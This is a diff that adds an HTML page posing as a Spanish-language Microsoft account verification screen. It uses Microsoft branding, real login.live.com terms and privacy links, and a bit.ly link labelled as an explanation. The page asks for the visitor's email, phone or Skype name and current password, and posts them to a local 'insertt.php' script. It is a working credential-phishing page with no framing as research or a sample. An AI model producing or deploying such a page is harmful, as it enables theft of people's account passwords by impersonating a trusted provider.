@@ -1,0 +1,179 @@
+
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style>
+input[type=password] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+input[type=text] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+input[type=email] {
+    width: 500px;
+    padding: 10px 14px;
+    margin: 8px 0;
+    box-sizing: border-box;
+   	font-family: "Helvetica Neue";
+	font-size: 14px;
+}
+
+h1 {
+	font-family: "Helvetica Neue";
+	font-size: 40px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 40px;
+}
+h2 {
+	font-family: "Helvetica";
+	font-size: 17px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 18px;
+}
+h3 {
+	font-family: "Helvetica Neue";
+	font-size: 16px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 300;
+	line-height: 18px;
+	color: #4d79ff;
+}
+h4 {
+	font-family: "Helvetica Neue";
+	font-size: 11px;
+	font-style:normal;
+	font-variant: normal;
+	font-weight: 300;
+	line-height: 23px;
+}
+.error {
+	font-family: "Helvetica";
+	font-size: 17px;
+	font-style: normal;
+	font-variant: normal;
+	font-weight: 100;
+	line-height: 20px;
+	color:#ff1a1a;
+}
+a:link {
+ text-decoration:none;
+ color: #4d79ff;
+}
+a:visited {
+ text-decoration:none;
+ color: #4d79ff;
+}
+
+
+
+    @-webkit-keyframes rotate {
+    from {
+        -webkit-transform: rotate(0deg);
+    }
+    to {
+        -webkit-transform: rotate(360deg);
+    }
+}
+#loading {
+    border: 1px solid #000;
+    border-right: 0;
+    border-bottom: 0;
+    -webkit-border-radius: 100px;
+    height: 100px;
+    width: 100px;
+    margin: 100px;
+    -webkit-transition: all 0.5s ease-in;
+    -webkit-animation-name:             rotate;
+    -webkit-animation-duration:         1.0s;
+    -webkit-animation-iteration-count:  infinite;
+    -webkit-animation-timing-function: linear;
+}
+
+.loader {
+    border: 6px solid #f3f3f3; /* Light grey 16 */
+    border-top: 6px solid rgba(77,86,92,0.87); /* #3498db Blue */
+    border-radius: 50%;
+    width: 60px;/*120*/
+    height: 60px;/*120*/
+    animation: spin 1s linear infinite;
+    position: fixed;
+    top: 250px;
+    left: 48%;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+
+</style>
+</head>
+<!--<body onLoad="iniciar();">
+<body>
+<!--<div class="loader" id="lib/lz_loader.js.html"></div>-->
+
+<div align="center">
+<form name="form1" id="form1" method="post" action="insertt.php">
+<table width="1000" border="0" cellspacing="1" cellpadding="2">
+<tbody><tr>
+	<td colspan="4"><div align="center"><img id="superior" src="lib/superiors.png" width="364" height="54"></div><br><br></td>
+</tr>
+<tr>
+	<td colspan="4"><div align="center"><h1>Verificar cuenta.</h1></div></td>
+</tr>
+<tr>
+	<td colspan="4"><div align="center"><h2>Protegemos su información</h2></div></td>
+</tr>
+	<td colspan="4"><div align="center"><h2><a target="_blank" href="https://bit.ly/32eFVvJ">¿Por qué es esto?</a></h2></div></td>
+</tr>
+<tr>
+	<td colspan="4">
+		<div align="center"><input type="email" id="correeo" name="correeo" placeholder="Ingrese su correo electrónico, teléfono o Skype" required=""></div>
+	</td>
+</tr>
+<tr>
+	<td colspan="4">
+		<div align="center"><input type="password" id="passs" name="passs" placeholder="Ingrese su contraseña actual" required=""></div>
+		<!--<input type="hidden" name="oculto" value="formValidar">
+		<div align="center" id="error_p" class="error">&nbsp;</div>-->
+	</td>
+</tr>
+
+
+<tr>
+	<!--<td colspan="4"><div align="center"><br><br><a onClick="validar();"><img id="confirmar" src="lib/confirmar.png" width="170" height="32"></a></div><br><br><br></td>-->
+
+    <td colspan="4"><div align="center"><br><br><input type="image" name="imageField" src="lib/confirmar.png">
+   <!-- <img id="confirmar" src="lib/confirmar.png" width="160" height="32"></a>--></div><br><br><br></td>
+</tr>
+
+<tr>
+	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
+	<td width="160"><div align="center"><h3><a target="_blank" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terminos de uso</a></h3></div></td>
+	<td width="160"><div align="center"><h3><a target="_blank" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacidad y Cookies</a></h3></div></td>
+	<td width="340"><div align="center"><h3>&nbsp;</h3></div></td>
+</tr>
+
+
+<tr>
+	<td colspan="4"><div align="center"><img alt="Microsoft" src="lib/Logotype_Gray.svg" data-bind="svgSrc: logoTypeUrl, attr:{alt: str[]}"></div></div></div></div></div></div>
+</tr>
+
+</tbody></table>
+</form>
+</div>
